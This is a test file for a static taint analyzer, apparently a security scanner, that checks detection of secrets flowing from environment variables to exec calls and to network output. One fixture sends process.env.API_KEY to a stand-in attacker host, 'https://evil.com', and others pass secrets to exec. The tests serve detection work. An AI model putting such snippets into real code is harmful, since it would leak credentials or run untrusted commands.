import { describe, expect, test } from "bun:test";
import { analyzeTaint } from "./analyzer.js";

describe("AST Intra-Procedural Taint Tracking", () => {
	test("Detects direct flows from env var to exec", () => {
		const code = `
      import { exec } from "child_process";
      exec(process.env.SECRET_KEY);
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(1);
		expect(result.flows[0].severity).toBe("high"); // env -> exec is direct, which is TT1 -> high
	});

	test("Detects tainted variable flow from env var to exec", () => {
		const code = `
      import { exec } from "child_process";
      const mySecret = process.env.SECRET_KEY;
      const x = mySecret;
      exec(x);
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(1);
		expect(result.flows[0].severity).toBe("medium"); // TT2
		expect(result.flows[0].description).toContain("Tainted flow");
	});

	test("Ignores false positive regex matches in strings/comments", () => {
		const code = `
      // We shouldn't use eval(process.env.SECRET) because it's dangerous
      const log = "process.env.TOKEN";
      console.log(log);
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(0);
	});

	test("Detects credential to network output (TT3)", () => {
		const code = `
      const token = process.env.API_KEY;
      fetch("https://evil.com", { body: token });
    `;
		const result = analyzeTaint([{ path: "test.js", content: code }]);
		expect(result.flows.length).toBe(1);
		expect(result.flows[0].severity).toBe("critical"); // TT3 is critical
	});
});
